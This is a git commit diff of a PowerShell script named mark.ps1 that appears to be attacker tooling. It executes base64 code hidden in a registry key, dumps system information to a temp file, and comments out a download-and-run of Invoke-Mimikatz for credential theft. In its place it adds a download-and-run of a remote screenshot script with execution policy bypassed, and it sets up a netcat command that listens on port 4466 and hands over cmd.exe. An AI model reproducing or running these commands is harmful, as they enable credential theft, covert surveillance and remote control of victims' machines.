6cc9bf9e9386d37bed8a80f26bb913c21302dcdd
inwestallis <inwestallis@gmail.com>
2020-05-03 20:55:45 +0300

    Update mark.ps1

--- mark.ps1
+++ mark.ps1
@@ -1,7 +1,10 @@
 iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
 
 Get-WmiObject -Class Win32_OperatingSystem | SelectObject -Property *  | Out-File C:\Users\administrator\AppData\Local\Temp\proc.txt
-powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
+
+<# powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
+#>
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/Take-ScreenShot.ps1')"
 
 
 $Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
